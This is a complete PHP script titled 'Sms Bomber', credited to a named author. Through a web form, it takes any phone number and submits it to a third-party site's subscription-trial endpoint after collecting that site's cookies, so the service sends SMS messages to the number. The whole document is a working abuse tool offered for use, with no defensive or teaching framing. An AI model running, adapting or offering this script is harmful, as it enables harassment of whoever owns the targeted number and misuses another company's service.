<?php

/**
 * Sms Bomber
 * By: BlackM4ster 24/06/2016
 * https://www.youtube.com/watch?v=x0wJXodckQA
 * https://github.com/isc30/SmallProjects/blob/master/sms_bomber.php
 */
class Application
{
    /** Application Constructor */
    public function __construct()
    {
        if (isset($_POST['number']))
        {
            echo $this->sendSms($_POST['number']) ? 'SMS enviado' : 'Ha ocurrido un error';
        }
        else
        {
            echo $this->getForm();
        }
    }

    /** @return string */
    protected function getForm()
    {
        /** @lang HTML */
        return <<<'HTML'
<form action="" method="POST">
    Number: <input type="text" name="number" value="" />
    <input type="submit" value="Send SMS" />
</form>
HTML;
    }

    /**
     * @param integer $number
     * @return bool
     */
    protected function sendSms($number)
    {
        $cookieFilename = 'cookie.tmp';

        // Simulate standard visitor
        $ch = curl_init('http://signin.applicateka.com');
        curl_setopt_array($ch, array
        (
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIEJAR => $cookieFilename,
            CURLOPT_COOKIEFILE => $cookieFilename
        ));
        curl_exec($ch);

        // Send SMS
        $ch = curl_init('http://signin.applicateka.com/main/subscription/try');
        curl_setopt_array($ch, array
        (
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIEJAR => $cookieFilename,
            CURLOPT_COOKIEFILE => $cookieFilename,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query(array
            (
                'subscription' => true,
                'method' => 'web',
                'operator' => false,
                'msisdn' => $number
            ))
        ));
        curl_exec($ch);
        $info = curl_getinfo($ch);

        return $info['http_code'] === 302;
    }
}

new Application();